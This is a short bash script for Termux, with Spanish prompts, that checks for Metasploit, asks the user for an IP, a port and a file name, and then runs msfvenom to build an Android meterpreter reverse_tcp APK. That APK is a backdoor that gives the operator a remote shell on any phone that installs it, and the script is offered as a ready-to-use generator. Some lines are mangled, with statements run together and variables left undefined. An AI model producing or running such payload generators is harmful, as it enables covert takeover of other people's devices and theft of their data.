#!/data/data/com.termux/files/usr/bin/bash
clear
#Variables

                red='\033[1;31m'
                green='\033[1;32m'
	        yellow='\033[1;33m'
		blue='\033[1;34m'
	        magenta='\033[1;35m'                                 cyan='\033[1;36m'
		reset='\033[0m'

printf $red		
figlet -f smslant  msfvenom
if command -v msfconsole >/dev/null 2>&1; then
    echo -e "${green}[+] Metasploit Framework está instalado.${NC}"

    # Intenta obtener la versión                         VERSION=$(msfconsole --version 2>&1 | head -n 1)     echo -e "${VERDE}[+] $VERSION${NC}"
else
    echo -e "${red}[-] Metasploit Framework NO está instalado ${NC}"

exit 1

fi

echo -e "${green}Generador de APK con Metasploit ${reset}"

# Solicitar datos al usuario
read -p "$(echo -e "${yellow}Introduce tu IP (LHOST): ${reset}")" ip
read -p "$(echo -e "${yellow}Introduce el puerto (LPORT): ${reset}")" puerto
read -p "$(echo -e "${yellow}Nombre del archivo de salida (ej: prueba.apk): ${reset}")" nombre

# Comando msfvenom para crear el payload de Android
echo -e "${cyan}[*] Generando el archivo $nombre...${reset}"
msfvenom -p android/meterpreter/reverse_tcp LHOST=$ip LPORT=$puerto R > $nombre

if [ $? -eq 0 ]; then
    echo -e "${green}[+] APK creado con éxito: ${cyan} $(pwd)/$nombre${reset}"
else
    echo -e "\033[0;31m[-] Error al crear el APK. Verifica que Metasploit esté instalado.\033[0m"
fi

